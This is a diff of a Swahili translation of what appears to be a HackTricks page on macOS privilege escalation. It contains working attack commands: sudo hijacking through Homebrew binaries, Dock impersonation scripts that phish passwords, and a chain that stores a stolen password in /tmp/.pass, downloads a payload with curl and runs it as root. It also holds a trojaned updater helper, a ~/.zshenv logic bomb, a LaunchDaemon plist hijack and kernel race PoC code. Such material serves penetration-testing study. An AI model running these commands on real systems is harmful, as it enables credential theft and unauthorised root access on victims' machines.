@@ -4,7 +4,7 @@
 
 ## TCC Privilege Escalation
 
-Ikiwa umefika hapa ukitafuta TCC privilege escalation, nenda kwa:
+Ikiwa umefika hapa ukitafuta TCC privilege escalation, nenda kwenye:
 
 
 {{#ref}}
@@ -13,7 +13,7 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Tafadhali kumbuka kwamba **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** mashine. Kwa hivyo angalia:
+Tafadhali kumbuka kwamba **hila nyingi kuhusu privilege escalation zinazoathiri Linux/Unix zitaathiri pia** mashine za MacOS. Kwa hiyo angalia:
 
 
 {{#ref}}
@@ -24,9 +24,9 @@ Tafadhali kumbuka kwamba **most of the tricks about privilege escalation affecti
 
 ### Sudo Hijacking
 
-You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+Unaweza kupata Sudo Hijacking technique ya awali ndani ya [chapisho la Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).
 
-However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim will execute when **running sudo:**
+Hata hivyo, macOS **huhifadhi** **`PATH`** ya mtumiaji anapoendesha **`sudo`**. Hii inamaanisha kwamba njia nyingine ya kutekeleza shambulio hili ni **ku-hijack binaries nyingine** ambazo victim bado atatekeleza anapoendesha **sudo:**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<'EOF'
@@ -41,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Kumbuka kwamba mtumiaji anayevumia terminali ana uwezekano mkubwa wa kuwa na **Homebrew imewekwa**. Hivyo inawezekana ku-hijack binaries katika **`/opt/homebrew/bin`**.
+Kumbuka kwamba user anayetumia terminal ana uwezekano mkubwa wa kuwa na **Homebrew installed**. Kwa hiyo inawezekana kuhijack binaries katika **`/opt/homebrew/bin`**.
 
 ### Dock Impersonation
 
-Kwa kutumia **social engineering** unaweza **impersonate, kwa mfano, Google Chrome** ndani ya Dock na kwa kweli execute script yako mwenyewe:
+Kwa kutumia **social engineering**, unaweza **kujiwakilisha kwa mfano kama Google Chrome** ndani ya dock na kwa kweli kuendesha script yako mwenyewe:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
-Mapendekezo:
+Baadhi ya mapendekezo:
 
-- Angalia katika Dock kama kuna Chrome, na katika hali hiyo **remove** ile entry na **add** **fake** **Chrome entry in the same position** katika Dock array.
+- Kagua Dock ikiwa kuna Chrome, na ikiwa ipo, **ondoa** entry hiyo kisha **ongeza** entry ya Chrome **bandia** katika nafasi hiyo hiyo kwenye Dock array.
 
 <details>
 <summary>Chrome Dock impersonation script</summary>
@@ -129,16 +129,16 @@ killall Dock
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
-Mapendekezo kadhaa:
+Baadhi ya mapendekezo:
 
-- Huwezi **kuondoa Finder kutoka Dock**, hivyo ikiwa unakusudia kuiweka katika Dock, unaweza kuweka Finder bandia karibu kabisa na ile halisi. Kwa hili unahitaji **kuongeza kipengele cha Finder bandia mwanzoni mwa array ya Dock**.
-- Chaguo jingine ni kutokuiweka katika Dock na kuifungua tu; "Finder asking to control Finder" si jambo la ajabu sana.
-- Njia nyingine za **kupanda hadhi hadi root bila kuuliza** nywila kwa sanduku mbaya, ni kufanya Finder kwa kweli aombe nywila ili kufanya kitendo chenye ruhusa:
-- Ombia Finder kunakili hadi **`/etc/pam.d`** faili mpya ya **`sudo`** (The prompt asking for the password will indicate that "Finder wants to copy sudo")
-- Ombia Finder kunakili **Authorization Plugin** mpya (Unaweza kudhibiti jina la faili ili sehemu inayouliza nywila itaonyesha kwamba "Finder wants to copy Finder.bundle")
+- **Huwezi kuondoa Finder kwenye Dock**, kwa hivyo ikiwa utaiongeza kwenye Dock, unaweza kuweka Finder fake karibu kabisa na ile halisi. Kwa hili unahitaji **kuongeza entry ya Finder fake mwanzoni mwa array ya Dock**.
+- Chaguo jingine ni kuto kuiweka kwenye Dock na kuifungua tu; "Finder asking to control Finder" si jambo la ajabu sana.
+- Chaguo jingine la **ku-escalate hadi root bila kuomba** password kupitia kisanduku kibaya, ni kufanya Finder iombe kweli password ili kutekeleza action yenye privileged:
+- Iambie Finder ikopi faili mpya ya **`sudo`** kwenye **`/etc/pam.d`** (prompt inayoomba password itaonyesha kwamba "Finder wants to copy sudo")
+- Iambie Finder ikopi **Authorization Plugin** mpya (Unaweza kudhibiti jina la faili ili prompt inayoomba password ionyeshe kwamba "Finder wants to copy Finder.bundle")
 
 <details>
-<summary>Script ya kuiga Finder kwenye Dock</summary>
+<summary>Finder Dock impersonation script</summary>
 ```bash
 #!/bin/sh
 
@@ -215,11 +215,11 @@ killall Dock
 
 ### Password prompt phishing + sudo reuse
 
-Malware mara nyingi hutumia mwingiliano wa mtumiaji ili **kunasa nenosiri linaloweza kutumika na sudo** na kulitumia tena kwa njia ya programu. Mtiririko wa kawaida:
+Malware mara kwa mara hutumia mwingiliano wa mtumiaji **kunasa password yenye uwezo wa sudo** na kuitumia tena kwa njia ya program. Mtiririko wa kawaida:
 
-1. Tambua mtumiaji aliyeko kwenye mfumo kwa kutumia `whoami`.
-2. **Rudia kuonyesha maombi ya nenosiri** hadi `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
-3. Hifadhi cheti/kibali (kwa mfano, `/tmp/.pass`) na endesha vitendo vinavyohitaji ruhusa za juu kwa kutumia `sudo -S` (nenosiri kupitia stdin).
+1. Tambua mtumiaji aliyeingia kwa kutumia `whoami`.
+2. **Rudia password prompts** hadi `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
+3. Hifadhi credential kwenye cache (kwa mfano, `/tmp/.pass`) na endesha vitendo vinavyohitaji privilege kwa kutumia `sudo -S` (password kupitia stdin).
 
 Mfano wa mnyororo mfupi:
 ```bash
@@ -232,13 +232,13 @@ printf '%s\n' "$pw" > /tmp/.pass
 curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
-Neno la siri lililoibwa linaweza kisha kutumika tena kwa **kuondoa karantini ya Gatekeeper kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye ruhusa za juu, na kuendesha hatua za ziada bila mwingiliano.
+Nenosiri lililoibwa linaweza kutumiwa tena **kuondoa Gatekeeper quarantine kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye privileged access, na kuendesha stages za ziada bila mwingiliano wa mtumiaji.
 
-## Njia mpya maalum za macOS (2023–2025)
+## Vectors maalum za macOS za hivi karibuni (2023–2025)
 
-### `AuthorizationExecuteWithPrivileges` iliyopitwa na matumizi bado inatumika
+### `AuthorizationExecuteWithPrivileges` iliyopitwa na wakati bado inaweza kutumika
 
-`AuthorizationExecuteWithPrivileges` ilifutwa matumizi katika 10.7 lakini **bado inafanya kazi kwenye Sonoma/Sequoia**. Waundaji wengi wa updaters wa kibiashara huita `/usr/libexec/security_authtrampoline` wakitumia njia isiyo ya kuaminika. Ikiwa binary lengwa ni user-writable unaweza kupandisha trojan na kuendesha prompt halali:
+`AuthorizationExecuteWithPrivileges` ilitangazwa kuwa deprecated katika 10.7 lakini **bado inafanya kazi kwenye Sonoma/Sequoia**. Updaters nyingi za kibiashara humwita `/usr/libexec/security_authtrampoline` ikiwa na path isiyoaminika. Ikiwa binary inayolengwa inaweza kuandikwa na mtumiaji, unaweza kupandikiza trojan na kutumia prompt halali:
 ```bash
 # find vulnerable helper calls
 log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
@@ -248,11 +248,50 @@ cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
 chmod +x /Users/me/Library/Application\ Support/Target/helper
 # when the app updates, the root prompt spawns your payload
 ```
-Yunganisha na **masquerading tricks above** ili kuonyesha dirisha la nenosiri linaloonekana halali.
+Unganisha na **masquerading tricks above** ili kuonyesha password dialog inayoaminika.
+
+
+### Uchunguzi wa Privileged helper / XPC
+
+Privescs nyingi za kisasa za third-party macOS hufuata pattern ileile: **root LaunchDaemon** hufichua **Mach/XPC service** kutoka **`/Library/PrivilegedHelperTools`**, kisha helper ama **haithibitishi client**, huihakiki **ikiwa imechelewa sana** (PID race), au hufichua **root method** inayotumia **user-controlled path/script**. Hii ndiyo bug class iliyo nyuma ya helper bugs nyingi za hivi karibuni katika VPN clients, game launchers na updaters.
+
+Orodha fupi ya uchunguzi:
+```bash
+ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
+plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
+for f in /Library/PrivilegedHelperTools/*; do
+echo "== $f =="
+codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
+strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
+done
+```
+Zingatia kwa makini helpers ambazo:
+
+- zinaendelea kukubali requests **baada ya uninstall** kwa sababu job iliendelea kubaki loaded kwenye `launchd`
+- zinaendesha scripts au kusoma configuration kutoka **`/Applications/...`** au paths nyingine zinazoweza kuandikwa na users wasio-root
+- zinategemea peer validation ya **PID-based** au **bundle-id-only** ambayo inaweza kuathiriwa na race condition
+
+Kwa maelezo zaidi kuhusu bugs za helper authorization, angalia [ukurasa huu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).
+
+### PackageKit script environment inheritance (CVE-2024-27822)
+
+Hadi Apple ilipoirekebisha katika **Sonoma 14.5**, **Ventura 13.6.7** na **Monterey 12.7.5**, installs zilizoanzishwa na user kupitia **`Installer.app`** / **`PackageKit.framework`** zingeweza kuendesha **PKG scripts kama root ndani ya environment ya user wa sasa**. Hii inamaanisha kuwa package iliyotumia **`#!/bin/zsh`** ingepakia **`~/.zshenv`** ya attacker na kuiendesha kama **root** wakati victim alipokuwa aki-install package.
+
+Hili linavutia hasa kama **logic bomb**: unahitaji tu foothold kwenye account ya user na shell startup file inayoweza kuandikwa, kisha unasubiri installer yoyote yenye mazingira magumu inayotumia **zsh** iendeshwe na user. Hili kwa ujumla **halitumiki kwa** deployments za **MDM/Munki** kwa sababu hizo huendeshwa ndani ya environment ya root user.
+```bash
+# inspect a vendor pkg for shell-based install scripts
+pkgutil --expand-full Target.pkg /tmp/target-pkg
+find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
+rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg
+
+# logic bomb example for vulnerable zsh-based installers
+echo 'id > /tmp/pkg-root' >> ~/.zshenv
+```
+Ikiwa unataka uchunguzi wa kina zaidi kuhusu matumizi mabaya maalum ya installer, pia angalia [ukurasa huu](macos-files-folders-and-binaries/macos-installers-abuse.md).
 
 ### LaunchDaemon plist hijack (CVE-2025-24085 pattern)
 
-Ikiwa LaunchDaemon plist au lengo lake la `ProgramArguments` ni **user-writable**, unaweza escalate kwa kubadilisha faili hiyo kisha kulazimisha launchd kupakia upya:
+Ikiwa LaunchDaemon plist au target yake ya `ProgramArguments` inaweza **kuandikwa na mtumiaji**, unaweza kufanya privilege escalation kwa kuibadilisha kisha kulazimisha launchd kuipakia upya:
 ```bash
 sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
 cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
@@ -269,37 +308,37 @@ cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
 PLIST
 sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
 ```
-Hii inaakisi mtindo wa exploit uliotangazwa kwa **CVE-2025-24085**, ambapo writable plist ilitumiwa vibaya kutekeleza attacker code kama root.
+Hii inaakisi muundo wa exploit uliochapishwa kwa **CVE-2025-24085**, ambapo plist inayoweza kuandikwa ilitumiwa kutekeleza code ya mshambulizi kama root.
 
 ### XNU SMR credential race (CVE-2025-24118)
 
-A **race in `kauth_cred_proc_update`** inampa attacker wa ndani uwezo wa kuharibu read-only credential pointer (`proc_ro.p_ucred`) kwa kukimbizana kwa `setgid()`/`getgid()` loops kati ya threads hadi `memcpy` iliyovunjika itokee. Uharibifu uliofanikiwa hutoa **uid 0** na ufikiaji wa kernel memory. Muundo wa minimal PoC:
+**Race katika `kauth_cred_proc_update`** humruhusu mshambulizi wa ndani kuharibu pointer ya credential ya kusomwa tu (`proc_ro.p_ucred`) kwa kuendesha kwa wakati mmoja mizunguko ya `setgid()`/`getgid()` kwenye threads hadi `memcpy` iliyokatika itokee. Uharibifu uliofanikiwa hutoa **uid 0** na ufikiaji wa memory ya kernel. Muundo wa chini kabisa wa PoC:
 ```c
 // thread A
 while (1) setgid(rand());
 // thread B
 while (1) getgid();
 ```
-Couple with heap grooming to land controlled data where the pointer re-reads. On vulnerable builds this is a reliable **local kernel privesc** without SIP bypass requirements.
+Couple pamoja na heap grooming ili kuweka data inayodhibitiwa mahali ambapo pointer inasomwa tena. Kwenye builds zilizoathirika, hii ni **local kernel privesc** inayotegemeka bila mahitaji ya SIP bypass.
 
-### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)
+### SIP bypass kupitia Migration assistant ("Migraine", CVE-2023-32369)
 
-Ikiwa tayari una root, SIP bado inalizuia uandishi kwa maeneo ya mfumo. Hitilafu **Migraine** inatumia entitlement ya Migration Assistant `com.apple.rootless.install.heritable` kuanzisha child process inayopokea urithi wa SIP bypass na kuandika juu ya protected paths (mfano, `/System/Library/LaunchDaemons`). Mfuatano:
+Ikiwa tayari una root, SIP bado huzuia uandishi kwenye maeneo ya mfumo. Bug ya **Migraine** hutumia vibaya entitlement ya Migration Assistant `com.apple.rootless.install.heritable` ili kuanzisha child process inayorithi SIP bypass na kubadilisha protected paths (kwa mfano, `/System/Library/LaunchDaemons`). Mlolongo huo ni:
 
-1. Pata root kwenye mfumo unaoendesha.
-2. Chochea `systemmigrationd` kwa crafted state ili kuendesha binary inayodhibitiwa na mshambuliaji.
-3. Tumia entitlement iliyorithiwa kurekebisha faili zilizo protected na SIP, zikidumu hata baada ya reboot.
+1. Pata root kwenye live system.
+2. Trigger `systemmigrationd` kwa state iliyoundwa ili iendeshe binary inayodhibitiwa na attacker.
+3. Tumia entitlement iliyorithiwa kupatch SIP-protected files, na hivyo kuendelea kufanya kazi hata baada ya reboot.
 
 ### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)
 
-Daemons kadhaa za Apple zinakubali **NSPredicate** objects kupitia XPC na zinathibitisha tu field ya `expressionType`, ambayo iko chini ya udhibiti wa mshambuliaji. Kwa kutengeneza predicate inayotathmini selectors yoyote unaweza kupata **code execution in root/system XPC services** (mfano, `coreduetd`, `contextstored`). Ikitumika pamoja na initial app sandbox escape, hii inatoa **privilege escalation without user prompts**. Tafuta XPC endpoints zinazodeserialize predicates na ambazo hazina visitor thabiti.
+Apple daemons nyingi hukubali objects za **NSPredicate** kupitia XPC na huthibitisha tu field ya `expressionType`, ambayo inadhibitiwa na attacker. Kwa kuunda predicate inayotathmini selectors holela, unaweza kupata **code execution katika root/system XPC services** (kwa mfano, `coreduetd`, `contextstored`). Ikichanganywa na app sandbox escape ya awali, hii hutoa **privilege escalation bila user prompts**. Tafuta XPC endpoints zinazodeserialize predicates na zisizo na visitor imara.
 
 ## TCC - Root Privilege Escalation
 
 ### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
 
-**Any user** (hata wale wasiokuwa na ruhusa) anaweza kuunda na mount Time Machine snapshot na **access ALL the files** za snapshot hiyo.  
-Ruhusa pekee inayohitajika ni kwamba programu inayotumika (kama `Terminal`) iwe na **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambayo inapaswa kutolewa na admin.
+**User yeyote** (hata asiye na privileges) anaweza kuunda na ku-mount time machine snapshot na **kufikia files ZOTE** za snapshot hiyo.\
+**Privilege pekee** inayohitajika ni kwa application inayotumika (kama `Terminal`) kuwa na access ya **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), ambayo lazima itolewe na admin.
 
 <details>
 <summary>Mount Time Machine snapshot</summary>
@@ -324,11 +363,12 @@ ls /tmp/snap/Users/admin_user # This will work
 ```
 </details>
 
-Ufafanuzi wa kina unaweza [**kupatikana katika ripoti ya awali**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+Maelezo ya kina zaidi yanaweza [**kupatikana katika ripoti ya awali**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
 ## Taarifa Nyeti
 
-Hii inaweza kusaidia kuinua vibali:
+Hii inaweza kuwa muhimu kwa kufanya privilege escalation:
+
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
@@ -338,5 +378,7 @@ macos-files-folders-and-binaries/macos-sensitive-locations.md
 
 - [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
 - [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
+- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
+- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
 
 {{#include ../../banners/hacktricks-training.md}}
